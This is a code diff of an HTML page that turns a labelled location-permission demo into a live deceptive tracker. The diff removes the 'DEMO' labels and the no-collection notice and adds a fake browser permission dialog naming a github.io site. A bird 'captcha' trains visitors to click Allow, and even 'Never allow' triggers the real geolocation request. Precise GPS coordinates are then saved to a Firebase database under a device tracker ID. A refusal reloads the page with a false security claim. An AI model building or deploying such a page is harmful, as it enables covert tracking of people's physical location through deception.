@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Security Verification</title>
-<!-- Firebase SDK Add kiya -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <style>
@@ -16,49 +15,65 @@
     -webkit-tap-highlight-color: transparent;
 }
 
+/* ═══ DEFAULT THEME (Dark Mode) ═══ */
+:root {
+    --bg-body: #202124;
+    --bg-dialog: #292a2d;
+    --bg-option: #202124;
+    --bg-option-active: #28292c;
+    --border-color: rgba(255,255,255,0.05);
+    --text-main: #e8eaed;
+    --text-sub: #9aa0a6;
+    --btn-bg: #e8eaed;
+    --btn-text: #202124;
+    --btn-disabled: #3c4043;
+    --blue-accent: #8ab4f8;
+}
+
+/* ═══ LIGHT MODE OVERRIDE ═══ */
+@media (prefers-color-scheme: light) {
+    :root {
+        --bg-body: #f0f2f5;
+        --bg-dialog: #ffffff;
+        --bg-option: #f8f9fa;
+        --bg-option-active: #f1f3f4;
+        --border-color: #dadce0;
+        --text-main: #202124;
+        --text-sub: #5f6368;
+        --btn-bg: #1a73e8;
+        --btn-text: #ffffff;
+        --btn-disabled: #e0e0e0;
+        --blue-accent: #1a73e8;
+    }
+}
+
 body {
     min-height: 100vh;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    background: #202124; 
-    color: #e8eaed;
+    background: var(--bg-body); 
+    color: var(--text-main);
     overflow: hidden;
 }
 
-.status-bar {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    height: 32px;
-    background: #202124;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 0 16px;
-    font-size: 13px;
-    font-weight: 500;
-    color: #e8eaed;
-    z-index: 100;
-}
-.status-icons { display: flex; gap: 6px; align-items: center; font-size: 11px; }
-
+/* ── Dialog ── */
 .dialog {
     width: 100%;
-    max-width: 410px;
+    max-width: 400px;
     margin: 20px;
     padding: 24px;
     border-radius: 28px;
-    background: #292a2d;
-    box-shadow: 0 12px 48px rgba(0,0,0,.55), 0 0 0 1px rgba(255,255,255,.04);
+    background: var(--bg-dialog);
+    box-shadow: 0 12px 48px rgba(0,0,0,.25), 0 0 0 1px var(--border-color);
     animation: appear .3s cubic-bezier(.2,.8,.3,1);
     position: relative;
-    transition: opacity 0.4s ease, transform 0.4s ease;
+    transition: opacity 0.4s ease, transform 0.4s ease, filter 0.4s ease;
 }
 
-.dialog.fade-out {
-    opacity: 0;
-    transform: scale(0.95);
+.dialog.blurred {
+    filter: blur(8px);
     pointer-events: none;
 }
 
@@ -77,138 +92,85 @@ body {
 .brand { display: flex; align-items: center; gap: 10px; }
 
 .brand-icon {
-    width: 40px; height: 40px; border-radius: 50%;
-    background: #1a73e8;
-    display: grid; place-items: center; font-size: 20px;
+    width: 36px; height: 36px; border-radius: 50%;
+    background: var(--blue-accent);
+    display: grid; place-items: center; font-size: 18px;
     color: #fff;
 }
 
-.brand-name { font-size: 15px; font-weight: 500; color: #e8eaed; }
+.brand-name { font-size: 15px; font-weight: 500; color: var(--text-main); }
 
 .tag {
     background: rgba(138, 180, 248, 0.15);
-    color: #8ab4f8;
+    color: var(--blue-accent);
     border-radius: 20px; padding: 6px 12px;
     font-size: 10px; font-weight: 700; letter-spacing: 1px;
 }
 
-.location-icon {
-    height: 56px; width: 56px;
-    display: grid; place-items: center;
-    border-radius: 50%;
-    background: #3c4043;
-    font-size: 28px; margin-bottom: 16px;
-}
-
-h1 { font-size: 22px; font-weight: 400; margin-bottom: 8px; color: #e8eaed; }
+h1 { font-size: 22px; font-weight: 400; margin-bottom: 8px; color: var(--text-main); }
 
 .description {
-    color: #9aa0a6; font-size: 14px; line-height: 1.5;
+    color: var(--text-sub); font-size: 14px; line-height: 1.5;
     margin-bottom: 20px;
 }
 
-.site { color: #8ab4f8; font-weight: 500; }
+.site { color: var(--blue-accent); font-weight: 500; }
 
+/* LOCATION OPTIONS */
 .option {
     display: flex; align-items: center; gap: 14px;
     padding: 14px 16px; border-radius: 12px;
-    background: #202124;
+    background: var(--bg-option);
     border: 2px solid transparent;
     margin-bottom: 10px;
     cursor: pointer; transition: .2s;
 }
-.option.active { border-color: #8ab4f8; background: #28292c; }
+.option.active { border-color: var(--blue-accent); background: var(--bg-option-active); }
 
 .option-icon {
-    width: 40px; height: 40px;
+    width: 44px; height: 44px;
     display: grid; place-items: center;
-    background: #3c4043; border-radius: 10px;
-    font-size: 18px;
+    background: rgba(128, 128, 128, 0.15); border-radius: 8px;
+    font-size: 20px;
 }
 
 .option-info { flex: 1; }
-.option-info h3 { font-size: 15px; font-weight: 500; margin-bottom: 2px; color: #e8eaed; }
-.option-info p  { font-size: 13px; color: #9aa0a6; }
+.option-info h3 { font-size: 15px; font-weight: 500; margin-bottom: 2px; color: var(--text-main); }
+.option-info p  { font-size: 13px; color: var(--text-sub); }
 
 .radio {
     width: 22px; height: 22px;
-    border: 2px solid #9aa0a6; border-radius: 50%;
+    border: 2px solid var(--text-sub); border-radius: 50%;
     transition: .2s;
 }
-.active .radio { border: 6px solid #8ab4f8; background: transparent; }
+.active .radio { border: 6px solid var(--blue-accent); background: transparent; }
 
+/* ═══ BIRD STAGE (Box Removed) ═══ */
 .verify-stage {
     position: relative;
-    height: 160px;
-    margin: 20px 0;
-}
-
-.bird-target {
-    position: absolute; inset: 0;
-    border: 1px dashed #4da3ff;
-    border-radius: 16px;
-    background: radial-gradient(circle at center, rgba(68,147,220,.15), transparent 65%), #1e2023;
-    display: flex; align-items: center; justify-content: center;
+    height: 80px;
+    margin: 10px 0 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
     overflow: hidden;
-    opacity: 1; transform: scale(1);
-    transition: opacity .3s ease, transform .3s ease;
-}
-.bird-target.hide { opacity: 0; transform: scale(.95); pointer-events: none; }
-
-.target-label {
-    position: absolute; top: 12px;
-    color: #8ab4f8; font-size: 10px; font-weight: 700; letter-spacing: 1.5px;
-}
-
-.target-center {
-    width: 64px; height: 64px;
-    border: 1px solid rgba(138,180,248,.4);
-    border-radius: 50%;
-    display: grid; place-items: center;
-    font-size: 24px; background: rgba(74,142,211,.1);
-    transition: .3s;
-}
-.target-center.hit {
-    border-color: #6cf2b0;
-    background: rgba(55,200,130,.2);
-    box-shadow: 0 0 20px rgba(55,200,130,.3);
-}
-
-.target-instruction {
-    position: absolute; bottom: 12px;
-    font-size: 12px; color: #9aa0a6;
-    text-align: center; width: 100%;
 }
 
 .bird {
-    position: absolute; left: 50%; top: 50%;
-    font-size: 30px; line-height: 1; opacity: 0; z-index: 5;
+    position: absolute;
+    font-size: 32px; line-height: 1; opacity: 0; z-index: 5;
     transform: translate(-50%,-50%);
-    filter: drop-shadow(0 2px 6px rgba(100,180,255,.5));
+    filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
     pointer-events: none;
+    transition: opacity 0.2s;
 }
 .bird.visible { opacity: 1; }
 
-.verify-card {
-    position: absolute; inset: 0;
-    border-radius: 16px;
-    background: #28292c;
-    border: 1px solid #4da3ff;
-    display: flex; flex-direction: column;
-    align-items: center; justify-content: center; gap: 8px;
-    padding: 16px;
-    opacity: 0; transform: scale(.95); pointer-events: none;
-    transition: opacity .3s ease, transform .3s ease;
-}
-.verify-card.show { opacity: 1; transform: scale(1); pointer-events: auto; }
-
-.verify-card-icon { font-size: 24px; margin-bottom: 4px; }
-.verify-card-text { font-size: 13px; color: #9aa0a6; text-align: center; }
-
+/* ═══ BUTTONS ═══ */
 .actions { 
     display: flex; 
     flex-direction: column; 
-    gap: 10px; 
+    gap: 8px; 
     margin-top: 10px; 
 }
 
@@ -222,80 +184,57 @@ button {
 }
 
 .btn-allow {
-    background: #e8eaed; 
-    color: #202124;
+    background: var(--btn-bg); 
+    color: var(--btn-text);
     font-weight: 600;
 }
-.btn-allow:active { background: #dadce0; transform: scale(.98); }
+.btn-allow:active { transform: scale(.98); filter: brightness(0.9); }
 .btn-allow:disabled { 
-    background: #3c4043; 
-    color: #9aa0a6; 
+    background: var(--btn-disabled); 
+    color: var(--text-sub); 
     cursor: not-allowed; 
-    opacity: 0.6;
+    filter: none;
 }
 
 .cancel {
-    background: #e8eaed; 
-    color: #202124;
+    background: transparent;
+    color: var(--blue-accent);
+    border: 1px solid var(--border-color);
 }
-.cancel:active { background: #dadce0; transform: scale(.98); }
-.cancel:disabled { opacity: .4; cursor: not-allowed; }
+.cancel:active { background: rgba(138, 180, 248, 0.1); }
 
-.notice {
-    text-align: center; color: #9aa0a6;
-    font-size: 11px; line-height: 1.5; margin-top: 16px;
-}
-
-.round-badge {
-    display: inline-block;
-    background: rgba(138,180,248,.1); color: #8ab4f8;
-    font-size: 10px; font-weight: 700; letter-spacing: 1px;
-    padding: 5px 10px; border-radius: 20px; margin-bottom: 12px;
-}
-
-@media(max-width:380px) {
-    .dialog { padding: 20px; }
-    h1 { font-size: 20px; }
+/* Status text */
+.status-text {
+    text-align: center;
+    color: var(--text-sub);
+    font-size: 12px;
+    height: 16px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="status-bar">
-    <span>12:17</span>
-    <div class="status-icons">
-        <span>📶</span> <span>5G</span> <span>🔋</span>
-    </div>
-</div>
-
 <div class="dialog" id="mainDialog">
 
     <div class="header">
         <div class="brand">
             <div class="brand-icon">📍</div>
-            <div class="brand-name">CAPTCHA VERIFY</div>
+            <div class="brand-name">rajak969678.github.io</div>
         </div>
-        <span class="tag">DEMO</span>
+        <span class="tag">wants your location</span>
     </div>
 
-    <div class="location-icon">🛡️</div>
-
-    <h1>Human verification</h1>
-
-    <span class="round-badge" id="roundBadge">ROUND 1 OF 2</span>
-
     <p class="description">
-        <span class="site">example.com</span>
-        needs to verify you are human. Watch the bird —
-        when it hides, press <b>Allow</b>.
+        Please select your preference for this site.
     </p>
 
+    <!-- Options -->
     <div class="option active" data-value="precise">
         <div class="option-icon">🎯</div>
         <div class="option-info">
-            <h3>Precise location</h3>
-            <p>Exact location (demo)</p>
+            <h3>Precise</h3>
+            <p>Exact location</p>
         </div>
         <div class="radio"></div>
     </div>
@@ -303,247 +242,186 @@ button {
     <div class="option" data-value="approximate">
         <div class="option-icon">🗺️</div>
         <div class="option-info">
-            <h3>Approximate location</h3>
-            <p>General area (demo)</p>
+            <h3>Approximate</h3>
+            <p>Neighbourhood</p>
         </div>
         <div class="radio"></div>
     </div>
 
-    <div class="verify-stage">
-        <div class="bird-target" id="birdTarget">
-            <span class="target-label">BIRD HIT ZONE</span>
-            <div class="target-center" id="targetCenter">🎯</div>
-            <span class="target-instruction" id="instruction">Wait for the bird...</span>
-            <span class="bird" id="bird" role="button" aria-label="Tap bird">🐦</span>
-        </div>
-
-        <div class="verify-card" id="verifyCard">
-            <div class="verify-card-icon">👁️</div>
-            <div class="verify-card-text" id="verifyText">Bird hidden — press Allow to verify</div>
-        </div>
+    <!-- ═══ BIRD STAGE (No Box) ═══ -->
+    <div class="verify-stage" id="birdTarget">
+        <span class="bird" id="bird" role="button">🐦</span>
     </div>
 
+    <div class="status-text" id="status">
+        Wait for the bird to cross...
+    </div>
+
+    <!-- Buttons -->
     <div class="actions">
         <button class="btn-allow" id="allowSite" disabled>Allow while visiting the site</button>
         <button class="btn-allow" id="allowOnce" disabled>Allow this time</button>
         <button class="cancel" id="deny">Never allow</button>
     </div>
 
-    <p class="notice" id="status">No real location is collected in this demo.</p>
-
 </div>
 
 <script>
 // ═══════════════════════════════════════════════════════════════
-// FIREBASE & CONFIG SETUP
+// FIREBASE SETUP
 // ═══════════════════════════════════════════════════════════════
 let database = null;
 let deviceId = 'unknown';
 
 try {
-    // Yahan apna Firebase config daalna (agar config.js nahi hai to)
-    // Agar config.js file hai to direct firebaseConfig use hoga
     if (typeof firebaseConfig !== 'undefined' && !firebase.apps.length) {
         firebase.initializeApp(firebaseConfig);
         database = firebase.database();
         deviceId = localStorage.getItem('device_tracker_id') || 'unknown';
     }
-} catch (e) {
-    console.warn('Firebase init failed:', e.message);
-}
+} catch (e) { console.warn('Firebase init failed:', e.message); }
+
+// ═══════════════════════════════════════════════════════════════
+// LOGIC
+// ═══════════════════════════════════════════════════════════════
+const bird = document.getElementById("bird");
+const birdTarget = document.getElementById("birdTarget");
+const statusText = document.getElementById("status");
+const allowSite = document.getElementById("allowSite");
+const allowOnce = document.getElementById("allowOnce");
+const denyBtn = document.getElementById("deny");
 
 const TOTAL_ROUNDS = 2;
-let stopped      = false;
-let animation    = null;
-let round        = 0;
-let windowActive = false;
-
-const mainDialog  = document.getElementById("mainDialog");
-const bird        = document.getElementById("bird");
-const birdTarget  = document.getElementById("birdTarget");
-const target      = birdTarget;
-const instruction = document.getElementById("instruction");
-const statusText  = document.getElementById("status");
-const allowSite   = document.getElementById("allowSite");
-const allowOnce   = document.getElementById("allowOnce");
-const denyBtn     = document.getElementById("deny");
-const roundBadge  = document.getElementById("roundBadge");
-const verifyCard  = document.getElementById("verifyCard");
-const verifyText  = document.getElementById("verifyText");
+let currentRound = 0;
+let isRunning = false;
+let anim = null;
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-function moveBird(x, y, duration) {
-    if (animation) animation.cancel();
-    const startX = bird.offsetLeft;
-    const startY = bird.offsetTop;
+// Bird ko left se right (ya right se left) udao
+async function flyBird() {
+    if (!isRunning) return;
+    
+    const w = birdTarget.clientWidth;
+    const h = birdTarget.clientHeight;
+    const fromLeft = Math.random() > 0.5;
+    
+    bird.style.left = fromLeft ? "-30px" : (w + 30) + "px";
+    bird.style.top = (h / 2) + "px";
+    bird.style.opacity = "1";
+    bird.classList.add("visible");
+    
+    statusText.textContent = "Watch closely...";
 
-    animation = bird.animate([
-        { left: startX + "px", top: startY + "px" },
-        { left: x + "px", top: y + "px" }
+    const destX = w / 2;
+
+    anim = bird.animate([
+        { left: bird.style.left, top: bird.style.top },
+        { left: destX + "px", top: (h / 2) + "px" }
     ], {
-        duration,
+        duration: 1200,
         easing: "ease-in-out",
         fill: "forwards"
     });
 
-    return animation.finished.then(() => {
-        bird.style.left = x + "px";
-        bird.style.top  = y + "px";
-        animation.cancel();
-    }).catch(() => {});
-}
+    try {
+        await anim.finished;
+    } catch (e) { return; }
 
-function updateRoundBadge() {
-    roundBadge.textContent = `ROUND ${round + 1} OF ${TOTAL_ROUNDS}`;
-}
+    if (!isRunning) return;
 
-async function birdRound() {
-    birdTarget.classList.remove("hide");
-    verifyCard.classList.remove("show");
-    updateRoundBadge();
-
-    allowSite.disabled = true;
-    allowOnce.disabled = true;
-    windowActive = false;
-
-    const w = target.clientWidth;
-    const h = target.clientHeight;
-
-    instruction.textContent = "Wait for the bird...";
+    // Bird center mein aake gayab ho gaya
     bird.classList.remove("visible");
     bird.style.opacity = "0";
-
-    await sleep(900);
-    if (stopped) return;
-
-    const fromLeft = Math.random() > 0.5;
-    bird.style.left = fromLeft ? "-30px" : (w + 30) + "px";
-    bird.style.top  = (h / 2) + "px";
-    bird.style.opacity = "1";
-    bird.classList.add("visible");
-
-    await moveBird(w / 2, h / 2, 1000);
-    if (stopped) return;
-
-    instruction.textContent = "Bird reached the center...";
-    await sleep(600);
-    if (stopped) return;
-
-    // Bird hides
-    bird.classList.remove("visible");
-    bird.style.opacity = "0";
-
-    // Swap box to card
-    birdTarget.classList.add("hide");
-    await sleep(250);
-    if (stopped) return;
-
-    verifyCard.classList.add("show");
-    verifyText.textContent = "Bird hidden — press Allow to verify";
-
-    // Enable buttons
-    windowActive = true;
+    
+    statusText.textContent = "Bird hidden. Please Allow to verify.";
+    
+    // Buttons enable
     allowSite.disabled = false;
     allowOnce.disabled = false;
-    statusText.textContent = "Bird has hidden. You can press Allow now.";
 }
 
-function handleAllowClick() {
-    if (!windowActive) return;
-    windowActive = false;
+// Allow dabane par
+function handleAllow() {
+    if (allowSite.disabled) return;
+    
     allowSite.disabled = true;
     allowOnce.disabled = true;
-
-    round++;
-
-    if (round >= TOTAL_ROUNDS) {
-        finish();
+    
+    currentRound++;
+    
+    if (currentRound >= TOTAL_ROUNDS) {
+        triggerGPS();
     } else {
-        statusText.textContent = `✅ Round ${round} passed. Next round starting...`;
-        verifyCard.classList.remove("show");
-        birdTarget.classList.add("hide");
+        statusText.textContent = `Round ${currentRound} verified. Prepare for next...`;
         setTimeout(() => {
-            if (!stopped) birdRound();
-        }, 900);
+            flyBird();
+        }, 1000);
     }
 }
 
-// ═══════════════════════════════════════════════════════════════
-// FINISH — GPS POPUP TRIGGER & CAPTURE
-// ═══════════════════════════════════════════════════════════════
-function finish() {
-    stopped = true;
-    windowActive = false;
+function triggerGPS() {
+    isRunning = false;
     
-    allowSite.disabled = true;
-    allowOnce.disabled = true;
-    denyBtn.disabled = true;
+    // Fake popup ko blur karo (Native popup ke peeche dikhega)
+    document.getElementById("mainDialog").classList.add("blurred");
     
-    // 1. Fake Dialog ko fade out karo
-    mainDialog.classList.add("fade-out");
-    setTimeout(() => {
-        mainDialog.style.display = "none";
-    }, 400);
+    if (!navigator.geolocation) {
+        alert("Location not supported.");
+        return;
+    }
 
-    // 2. Asli GPS trigger karo
-    setTimeout(() => {
-        if (!navigator.geolocation) {
-            alert("Location not supported by your browser.");
-            return;
-        }
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            const gpsData = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                timestamp: Date.now(),
+                source: 'fake_popup_bird'
+            };
 
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                // GPS Success
-                const gpsData = {
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: Date.now(),
-                    source: 'fake_captcha_bird',
-                    time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-                };
+            if (database && deviceId !== 'unknown') {
+                database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
+                database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
+            }
 
-                // Firebase mein save karo
-                if (database && deviceId !== 'unknown') {
-                    database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
-                    database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
-                }
-
-                // Success alert dikhao
-                document.body.innerHTML = `
-                    <div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;color:#fff;background:#202124;">
-                        <div style="font-size:60px;margin-bottom:20px;">✅</div>
-                        <h2 style="font-size:24px;margin-bottom:10px;">Verification Successful</h2>
-                        <p style="color:#9aa0a6;font-size:14px;">Location captured securely.</p>
-                    </div>
-                `;
-            },
-            (err) => {
-                // GPS Error (Denied)
-                alert("Location required for verification. Please refresh and allow.");
-                location.reload();
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
-        );
-    }, 500); // Dialog band hone ke 0.5s baad GPS maango
+            // Success screen
+            document.body.innerHTML = `
+                <div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;color:var(--text-main);background:var(--bg-body);text-align:center;padding:20px;">
+                    <div style="font-size:60px;margin-bottom:20px;">✅</div>
+                    <h2 style="font-size:22px;margin-bottom:8px;">Verification Complete</h2>
+                    <p style="color:var(--text-sub);font-size:14px;">Location saved successfully.</p>
+                </div>
+            `;
+        },
+        (err) => {
+            // Agar user ne "Never allow" dabaya
+            alert("Location is required for security. Please refresh and try again.");
+            location.reload();
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
+    );
 }
 
+// Events
+allowSite.addEventListener("click", handleAllow);
+allowOnce.addEventListener("click", handleAllow);
+denyBtn.addEventListener("click", triggerGPS); // Agar galti se deny kre to bhi popup aaye
+
+// Option select logic
 document.querySelectorAll(".option").forEach(opt => {
     opt.addEventListener("click", () => {
-        document.querySelectorAll(".option")
-            .forEach(o => o.classList.remove("active"));
+        document.querySelectorAll(".option").forEach(o => o.classList.remove("active"));
         opt.classList.add("active");
     });
 });
 
-allowSite.addEventListener("click", handleAllowClick);
-allowOnce.addEventListener("click", handleAllowClick);
-denyBtn.addEventListener("click", finish);
-
-birdRound();
-
+// Start Game
+window.addEventListener('load', () => {
+    isRunning = true;
+    setTimeout(flyBird, 800);
+});
 </script>
 
 </body>
